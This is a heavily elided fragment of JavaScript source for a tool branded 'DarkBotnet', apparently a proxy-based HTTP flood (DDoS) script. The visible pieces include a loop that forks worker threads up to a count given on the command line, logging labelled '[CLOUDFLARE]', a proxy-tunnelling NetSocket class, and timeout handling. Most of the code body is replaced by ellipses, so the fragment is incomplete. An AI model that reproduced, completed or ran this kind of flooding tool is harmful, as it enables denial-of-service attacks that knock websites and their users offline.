...
This is made by  (worst developer)
这是由DarkBotnet（最差的开发人员）制作的
`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    ...
    .catch((error) => {
      if (error.message === 'Request timeout | DarkBotnet') {
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [CLOUDFLARE]  Threads:  ${i} | DarkBotnet`);
  }
 ...
 class NetSocket {
  ...
  HTTP(options, callback) {
     ...
     connection.on("data", chunk => {
         ...
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "Error : Invalid response from proxy server | DarkBotnet");
         }
     ...
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "Error: Request Timeout | DarkBotnet");
     });
